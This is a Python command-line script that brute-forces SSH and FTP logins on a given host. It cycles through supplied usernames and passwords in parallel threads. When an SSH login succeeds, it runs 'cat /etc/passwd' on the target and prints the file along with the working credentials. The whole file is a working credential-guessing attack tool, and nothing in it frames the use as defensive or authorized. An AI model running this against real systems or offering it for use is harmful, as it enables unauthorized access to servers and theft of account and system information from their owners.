#!/usr/bin/python3

import ftplib
import socket
import paramiko
import argparse
import concurrent.futures


def ftp_brute_force(tgtHost: str, usernames: list, passwords: list):
	ftp_server = ftplib.FTP()
	for username in usernames:
		for password in passwords:
			try:
				ftp_server.connect(tgtHost, 21, timeout=5)
				ftp_server.login(tgtHost, username, password)
				print(f'[+] SUCCESS [FTP] : CONNECTION ESTABLISHED TO HOST: {tgtHost}:{21}')
				print(f'[+] CREDENTIALS [FTP] : USERNAME|{username} PASSWORD|{password}')
			except TimeoutError:
				print(f'[-] FAILURE [FTP] : CONNECTION TIMEOUT TO HOST: {tgtHost}')
				exit(0)
			except socket.timeout:
				print(f'[-] FAILURE [FTP] : CONNECTION TIMEOUT TO HOST: {tgtHost}')
				exit(0)
			except ftplib.error_perm:
				print(f'[-] FAILURE [FTP] : INCORRECT CREDENTIALS')
			except Exception as e:
				print(type(e))
			finally:
				ftp_server.close()

def ssh_brute_force(tgtHost: str, usernames: list, passwords: list):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	for username in usernames:
		for password in passwords:
			try:
				ssh.connect(tgtHost, username=username, password=password, timeout=5, look_for_keys=False, allow_agent=False)
				stdin, stdout, stderr = ssh.exec_command('cat /etc/passwd')
				print(f'[+] SUCCESS [SSH] : CONNECTION ESTABLISHED TO HOST: {tgtHost}:{22}')
				print(f'[+] CREDENTIALS [SSH] : USERNAME|{username} PASSWORD|{password}')
				print(stdout.read())
			except TimeoutError:
				print(f'[-] FAILURE [SSH] : CONNECTION TIMEOUT TO HOST: {tgtHost}')
				exit(0)
			except socket.timeout:
				print(f'[-] FAILURE [SSH] : CONNECTION TIMEOUT TO HOST: {tgtHost}')
				exit(0)
			except paramiko.ssh_exception.AuthenticationException:
				print(f'[-] FAILURE [SSH] : INCORRECT CREDENTIALS')
			except Exception as e:
				print(type(e))
			finally:
				ssh.close()

def main():
	# TODO: ADD FUNCTIONALITY TO PARSE FROM FILES
	parser = argparse.ArgumentParser(usage='Usage of scanner: --H <target host> --U <potential usernames> --P <potential passwords>')
	parser.add_argument('--H', dest='tgtHost', type=str, help='specify target host')
	parser.add_argument('--U', dest='tgtUsr', type=str, help='specify potential usernames seperated by comma')
	parser.add_argument('--P', dest='tgtPswd', type=str, help='specify potential passwords seperated by comma')
	args = parser.parse_args()
	tgtHost = args.tgtHost
	tgtUser = str(args.tgtUsr).split(',')
	tgtPassword = str(args.tgtPswd).split(',')

	if (tgtHost == None) | (tgtUser[0] == 'None') | (tgtPassword[0] == 'None'):
		print(parser.usage)
		exit(0)

	print(f'***** Attempting SSH Brute Force Attack on {tgtHost} *****')
	print('=' * 70)

	with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
		future_one = executor.submit(ssh_brute_force, tgtHost, tgtUser, tgtPassword)
		future_two = executor.submit(ftp_brute_force, tgtHost, tgtUser, tgtPassword)

if __name__ == '__main__':
	main()